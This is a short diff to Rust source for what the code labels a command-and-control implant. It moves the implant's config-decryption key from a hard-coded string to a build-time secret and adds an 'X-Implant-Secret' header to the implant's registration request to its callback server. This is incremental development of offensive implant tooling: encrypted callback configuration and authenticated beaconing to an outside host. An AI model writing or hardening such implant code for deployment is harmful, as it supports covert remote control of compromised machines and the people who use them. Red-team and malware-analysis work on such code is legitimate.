@@ -7,6 +7,7 @@ use std::env;
 use std::process::Command;
 
 const CALLBACK: &str = env!("CALLBACK");
+const IMPLANT_SECRET: &str = env!("IMPLANT_SECRET");
 
 // ── System info ──────────────────────────────────────────────────────────────
 
@@ -64,7 +65,7 @@ fn platform_info() -> String {
 // ── Main C2 loop ─────────────────────────────────────────────────────────────
 
 pub fn link_loop() {
-    let encryption_key = derive_key("linky-secret-key", "callback-salt");
+    let encryption_key = derive_key(IMPLANT_SECRET, "callback-salt");
     let decrypted_callback =
         decrypt_config(CALLBACK, &encryption_key).unwrap_or_else(|| CALLBACK.to_string());
 
@@ -95,6 +96,7 @@ pub fn link_loop() {
     let mut x_req_id = loop {
         if let Ok(r) = client
             .post(format!("{}/static/register", base))
+            .header("X-Implant-Secret", IMPLANT_SECRET)
             .json(&reg)
             .send()
         {
